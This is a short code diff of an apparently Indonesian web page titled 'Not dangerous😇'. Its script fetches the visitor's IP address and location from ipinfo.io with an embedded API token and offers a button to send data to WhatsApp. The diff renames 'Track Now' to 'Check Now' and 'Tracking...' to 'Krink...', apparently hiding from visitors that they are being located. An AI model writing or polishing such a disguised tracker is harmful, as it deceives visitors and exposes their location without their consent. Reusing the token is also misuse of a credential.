@@ -34,7 +34,7 @@
 <body>
     <div class="container">
         <h2>Tidak Berbahaya😇</h2>
-        <button class="track-btn" onclick="startTracking()">Lacak Sekarang</button>
+        <button class="track-btn" onclick="startTracking()">Cek Sekarang</button>
         <div id="info"></div>
         <button class="send-btn" onclick="sendToWhatsApp()">Kirimkan</button>
     </div>
@@ -43,7 +43,7 @@
         let trackingData = {};
 
         async function startTracking() {
-            document.getElementById("info").innerHTML = "Melacak...";
+            document.getElementById("info").innerHTML = "Krink...";
 
             // Dapatkan IP & Lokasi
             let ipData = await fetch("https://ipinfo.io/json?token=6d8519218e7b69").then(res => res.json());
